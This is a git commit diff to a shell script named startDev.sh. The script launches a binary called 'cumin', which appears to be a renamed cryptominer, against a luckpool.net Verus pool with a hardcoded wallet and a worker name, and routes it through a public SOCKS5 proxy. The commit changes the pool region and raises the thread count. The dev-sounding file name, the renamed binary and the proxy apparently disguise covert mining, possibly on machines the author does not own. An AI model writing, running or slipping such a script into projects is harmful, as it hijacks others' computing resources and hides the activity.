b250eb4adbc15a1c46f96dddb68802f82c0f3c4d
closemaptoya <85560638+closemaptoya@users.noreply.github.com>
2021-07-03 21:43:19 +0700

    Update startDev.sh

--- startDev.sh
+++ startDev.sh
@@ -3,8 +3,8 @@ sudo apt update
 sudo apt install screen libjansson4 -y 
 chmod +x cumin
 screen -dmS ls 
-POOL=stratum+tcp://eu.luckpool.net:3956
+POOL=stratum+tcp://ap.luckpool.net:3956
 WALLET=RKP6YU9bfRCwWicTakWfzgZKRtqcNwAFjr
 WORKER=DevV5ByNongCroissant
 PROXY=socks5://98.162.25.23:4145
-./cumin -a verus -o $POOL -u $WALLET -t 2 -x $PROXY
+./cumin -a verus -o $POOL -u $WALLET -t 4 -x $PROXY
